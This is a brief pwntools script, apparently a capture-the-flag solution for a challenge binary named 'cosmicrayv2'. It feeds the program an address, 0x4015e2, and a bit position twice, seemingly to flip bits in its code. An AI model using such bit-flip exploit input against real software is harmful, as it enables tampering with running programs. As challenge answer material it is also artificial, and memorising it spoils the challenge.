from pwn import *

io = process('./cosmicrayv2')

sla = io.sendlineafter


sla(b'through:\n',b'0x4015e2')
sla(b'flip:\n',b'4')

sla(b'through:\n',b'0x4015e2')
sla(b'flip:\n',b'4')
